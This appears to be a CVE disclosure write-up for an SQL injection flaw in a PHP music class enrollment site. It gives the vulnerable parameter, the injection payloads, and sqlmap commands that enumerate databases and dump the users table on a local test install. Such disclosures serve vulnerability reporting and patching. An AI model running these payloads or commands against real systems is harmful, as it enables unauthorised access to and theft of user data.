# Sourecodester Music Class Enrollment System SQL Injection vulnerability
## CVE-2024-6067

Affected Software: https://www.sourcecodester.com/php/15362/music-class-enrollment-site-phpoop-free-source-code.html

Vulnerable path: http://localhost/mces/?p=class/view_class&id=4

![image](https://github.com/jadu101/CVE/assets/76433661/09db7303-c570-4296-bced-f0cab23d95a1)



Tool Used: SQLmap

Commands to recreate:

`sqlmap 'http://localhost/mces/?p=class/view_class&id=4' --batch`

![image](https://github.com/jadu101/CVE/assets/76433661/7833ceba-4326-4bb0-b454-67962e45c746)



```
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=class/view_class&id=4' AND 2160=2160 AND 'CscS'='CscS

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: p=class/view_class&id=4' AND (SELECT 6865 FROM (SELECT(SLEEP(5)))TZfN) AND 'sHBo'='sHBo
---
```

`sqlmap 'http://localhost/mces/?p=class/view_class&id=4' --batch –dbs`

![image](https://github.com/jadu101/CVE/assets/76433661/290f3bd2-3d3f-474e-b4a1-ae2458edacb7)



`sqlmap 'http://localhost/mces/?p=class/view_class&id=4' --batch -D mces_db -T users –dump`

![image](https://github.com/jadu101/CVE/assets/76433661/5802f597-a725-48b6-beb4-f86bdd959fb2)




